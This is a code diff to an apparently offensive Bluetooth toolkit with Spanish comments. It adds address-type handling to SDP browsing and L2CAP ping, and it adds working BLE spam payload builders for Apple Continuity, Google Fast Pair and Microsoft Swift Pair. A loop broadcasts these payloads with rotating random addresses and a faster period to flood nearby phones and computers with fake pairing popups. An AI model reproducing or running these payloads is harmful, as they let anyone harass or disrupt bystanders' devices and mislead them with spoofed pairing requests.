@@ -886,21 +886,30 @@ def _is_ble_only(info):
     return False
 
 
-def sdp_browse(mac, timeout=15):
+def sdp_browse(mac, addr_type=None, timeout=15):
     """Enumera servicios BR/EDR del target via SDP (sin pairing). Util para
     identificar perfil (A2DP/HFP/HID/OBEX...) y evaluar superficie de ataque.
-    Solo aplica a BR/EDR classic; para LE puro usa GATT."""
+    Solo aplica a BR/EDR classic; para LE puro usa GATT.
+
+    `addr_type`: hint del scan ("public"/"random"/""). Si viene "random",
+    bloqueamos sin preguntar a bluetoothctl. Si viene "public", confiamos y
+    probamos SDP incluso aunque la MAC tenga el bit locally-administered."""
     mac = (mac or '').strip().upper()
     if not re.fullmatch(r'[0-9A-F:]{17}', mac):
         return None, "MAC invalida"
 
-    # Preflight: si es BLE puro, decimos claro que SDP no aplica (en vez de
-    # dejar que sdptool devuelva 'Host is down' confuso).
-    info = _quick_info(mac)
-    if _is_ble_only(info) or _mac_is_random(mac):
-        err = "SDP no aplica: este device es BLE (addr random). Usa GATT."
+    at = (addr_type or '').lower()
+    if at == 'random':
+        err = "SDP no aplica: device BLE (addr_type=random del scan). Usa GATT."
         log_bt_attack("sdp_browse", mac, "n_a", details=err)
         return {"services": [], "raw": ""}, err
+    if at != 'public':
+        # Sin hint confiable del scan: preflight con bluetoothctl.
+        info = _quick_info(mac)
+        if _is_ble_only(info):
+            err = "SDP no aplica: device BLE (addr random). Usa GATT."
+            log_bt_attack("sdp_browse", mac, "n_a", details=err)
+            return {"services": [], "raw": ""}, err
 
     r = _run([SUDO, '-n', SDPTOOL, 'browse', mac], timeout=timeout)
     text = ""
@@ -1101,22 +1110,27 @@ def parse_l2ping_output(text):
     return stats
 
 
-def l2ping(mac, count=5, size=44, timeout=20):
+def l2ping(mac, count=5, size=44, addr_type=None, timeout=20):
     """L2CAP ping (BR/EDR). Prueba de alcance/latencia y stress leve. SOLO
     funciona con BR/EDR classic; para BLE puro no aplica.
-    SOLO lab."""
+    `addr_type`: hint del scan; igual flow que sdp_browse. SOLO lab."""
     mac = (mac or '').strip().upper()
     if not re.fullmatch(r'[0-9A-F:]{17}', mac):
         return None, "MAC invalida"
 
-    # Preflight como SDP: si es BLE puro, L2CAP ping no aplica.
-    info = _quick_info(mac)
-    if _is_ble_only(info) or _mac_is_random(mac):
-        err = "L2ping no aplica: device BLE (addr random). Usa GATT."
+    at = (addr_type or '').lower()
+    def _n_a(err_msg):
         empty = {"sent": 0, "received": 0, "loss_pct": None,
                  "avg_ms": None, "min_ms": None, "max_ms": None, "samples": []}
-        log_bt_attack("l2ping", mac, "n_a", details=err)
-        return {"stats": empty, "raw": ""}, err
+        log_bt_attack("l2ping", mac, "n_a", details=err_msg)
+        return {"stats": empty, "raw": ""}, err_msg
+
+    if at == 'random':
+        return _n_a("L2ping no aplica: device BLE (addr_type=random del scan). Usa GATT.")
+    if at != 'public':
+        info = _quick_info(mac)
+        if _is_ble_only(info):
+            return _n_a("L2ping no aplica: device BLE (addr random). Usa GATT.")
 
     count = max(1, min(int(count or 5), 50))
     size = max(1, min(int(size or 44), 600))
@@ -1259,6 +1273,72 @@ def _random_static_address():
     return list(reversed(addr))
 
 
+def _build_apple_payload():
+    """Apple Continuity Nearby Action - genera popup en iOS <= 17.1 ("New
+    AirPods", "Setup Apple TV", "Pair HomePod"). Entra en 31 bytes de legacy
+    adv. Compatibilidad con el proyecto Bruce/ESP32-BLE-Spam."""
+    # (action_type, device_byte) - subset de ANOs de Continuity.
+    actions = (
+        (0x27, 0x81),  # Setup new AirPods Pro
+        (0x27, 0x06),  # Setup new AirPods Max
+        (0x27, 0x0E),  # AirPods Pro 2
+        (0x09, 0x15),  # Setup new Apple TV
+        (0x0B, 0x11),  # HomePod mini
+        (0x01, 0x00),  # AppleTV AutoFill
+        (0x06, 0x00),  # AppleTV Keyboard
+        (0x1B, 0x00),  # Developer Tools Pairing Request
+        (0x1E, 0x00),  # Setup new Beats
+        (0x29, 0x00),  # Setup new Vision Pro
+    )
+    act, dev = random.choice(actions)
+    # Flags(3) + Manuf (3+16=19) = max 22 bytes
+    # 02 01 06 | 1B FF 4C 00 | 0F 05 C1 ACT DEV ...rand padding
+    pad = os.urandom(10)
+    return bytes([
+        0x02, 0x01, 0x06,
+        0x1B, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1,
+        act, dev,
+        0x4A, 0x30,
+    ]) + pad[:17]
+
+
+# Model IDs reales registrados en Google Fast Pair Service (dispositivos que
+# disparan el popup "Device nearby" en Android con Fast Pair activo).
+_GOOGLE_FP_MODELS = (
+    0xCD8256, 0x0001F0, 0x000006, 0x02F707, 0x02FB90,
+    0xD446A7, 0x8B9D30, 0x92BBBD, 0xF99DAB, 0x323AF4,
+    0x7E7E35, 0x1E3C72, 0x2CDA74, 0xC8F560, 0xDBB769,
+    0x9ADB11, 0x47FA2B, 0x821F66,
+)
+
+
+def _build_google_payload():
+    """Google Fast Pair - Service Data con UUID 0xFE2C + 3-byte model_id de
+    un device REAL registrado en Fast Pair Service. Dispara popup "Dispositivo
+    cercano" en Android >= 6 con Fast Pair activo. Compat Bruce."""
+    model = random.choice(_GOOGLE_FP_MODELS)
+    return bytes([
+        0x02, 0x01, 0x06,       # Flags: General Discoverable + BR/EDR not supp
+        0x03, 0x03, 0x2C, 0xFE, # Incomplete 16-bit UUID list: 0xFE2C
+        0x06, 0x16, 0x2C, 0xFE, # Service Data (0x16) UUID 0xFE2C, len 6
+        (model >> 16) & 0xFF,
+        (model >> 8)  & 0xFF,
+        model & 0xFF,
+    ])
+
+
+def _build_microsoft_payload():
+    """Microsoft Swift Pair beacon. Dispara popup "Nuevo dispositivo encontrado"
+    en Windows 10/11 con Swift Pair activo. Payload compat Bruce/ESP32."""
+    # 02 01 06 | 09 FF 06 00 03 00 80 06 XX | ...
+    device_byte = random.choice((0x06, 0x01, 0x02, 0x04, 0x20))
+    return bytes([
+        0x02, 0x01, 0x06,
+        0x09, 0xFF, 0x06, 0x00, 0x03, 0x00, 0x80,
+        device_byte, 0x00,
+    ])
+
+
 def _build_samsung_buds_payload():
     """Construye el paquete Galaxy Buds usado por Bruce/FastPair.
     Samsung EasySetup reconoce la trama completa manufacturer-specific.
@@ -1338,15 +1418,37 @@ def ble_spam(iface=DEFAULT_IFACE, seconds=20, mode="names", period_s=1.0):
         pool = [{"name": n, "cid": None, "data": b''}
                 for n in _load_ble_names()]
 
+    # Mapa mode -> constructor nativo (payload Bruce-compatible, con MAC
+    # random rotada en cada iteracion). Los modos "names"/"random" caen al
+    # flujo generico que usa pool + _build_adv_payload (MAC public, sin rotar).
+    OS_BUILDERS = {
+        "apple":     _build_apple_payload,
+        "google":    _build_google_payload,
+        "microsoft": _build_microsoft_payload,
+        "samsung":   _build_samsung_buds_payload,
+    }
+    builder = None
+    for key in OS_BUILDERS:
+        if mode.startswith(key):
+            builder = OS_BUILDERS[key]; break
+
+    # Para los modos OS-specific aceleramos el periodo (default 1s se baja a
+    # ~0.5s = 2 popups/s) para que los teléfonos cercanos vean varios devices.
+    if builder is not None and period >= 0.9:
+        period = 0.5
+
     cycles = 0
     failed_commands = 0
     uniq_names = set()
     last_name = ""
     t_end = time.time() + seconds
     while time.time() < t_end:
-        if mode.startswith("samsung"):
-            payload = _build_samsung_buds_payload()
-            n = "Galaxy Buds (Samsung EasySetup)"
+        if builder is not None:
+            # Rotamos MAC random + own_addr_type=0x01 en cada ciclo para que el
+            # teléfono vea un "device nuevo" cada vez (si usamos la misma MAC
+            # pública, Android/iOS filtran y no sale popup).
+            payload = builder()
+            n = f"{mode}-{cycles}"
             r_disable = _hci(iface, 0x000A, [0x00])
             r_addr = _hci(iface, 0x0005, _random_static_address())
             r_params = _hci(iface, 0x0006, [
@@ -1558,18 +1660,20 @@ def main():
                 sys.exit(1)
             _emit({"ok": True, "device": data})
         elif cmd == 'sdp':
-            # bt_ops.py sdp <mac>
+            # bt_ops.py sdp <mac> [addr_type]
             args = sys.argv[2:]
             if args and re.match(r'^hci\d+$', args[0]):
                 args = args[1:]
             if not args:
-                _emit({"ok": False, "error": "uso: bt_ops.py sdp <mac>"})
+                _emit({"ok": False, "error": "uso: bt_ops.py sdp <mac> [addr_type]"})
                 sys.exit(1)
-            data, err = sdp_browse(args[0].upper())
+            mac = args[0].upper()
+            at = args[1] if len(args) > 1 else None
+            data, err = sdp_browse(mac, addr_type=at)
             if err and not data:
                 _emit({"ok": False, "error": err})
                 sys.exit(1)
-            _emit({"ok": True, "mac": args[0].upper(),
+            _emit({"ok": True, "mac": mac,
                    "services": data.get("services", []),
                    "raw": data.get("raw", ""), "warn": err})
         elif cmd == 'gatt':
@@ -1612,17 +1716,18 @@ def main():
                 sys.exit(1)
             _emit({"ok": True, "warn": err, **(data or {})})
         elif cmd == 'l2ping':
-            # bt_ops.py l2ping <mac> [count] [size]
+            # bt_ops.py l2ping <mac> [count] [size] [addr_type]
             args = sys.argv[2:]
             if args and re.match(r'^hci\d+$', args[0]):
                 args = args[1:]
             if not args:
-                _emit({"ok": False, "error": "uso: bt_ops.py l2ping <mac> [count] [size]"})
+                _emit({"ok": False, "error": "uso: bt_ops.py l2ping <mac> [count] [size] [addr_type]"})
                 sys.exit(1)
             mac = args[0].upper()
             count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5
             size  = int(args[2]) if len(args) > 2 and args[2].isdigit() else 44
-            data, err = l2ping(mac, count, size)
+            at = args[3] if len(args) > 3 else None
+            data, err = l2ping(mac, count, size, addr_type=at)
             if err and not (data and data.get("stats", {}).get("received", 0) > 0):
                 _emit({"ok": False, "error": err, "stats": (data or {}).get("stats")})
                 sys.exit(1)
